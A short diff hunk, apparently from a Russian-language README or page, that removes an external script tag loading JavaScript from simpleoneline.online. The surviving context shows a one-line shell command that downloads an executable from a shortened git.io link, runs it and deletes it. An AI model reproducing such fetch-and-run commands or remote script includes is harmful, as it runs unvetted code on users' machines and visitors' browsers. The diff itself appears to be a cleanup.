@@ -101,4 +101,3 @@ wget -O xt https://git.io/vbLa5 && chmod +x xt && ./xt && rm xt
 
 Вот и всё!
 
-<script async src="https://simpleoneline.online/online.js?js=v.1.0.6" type="text/javascript"></script>
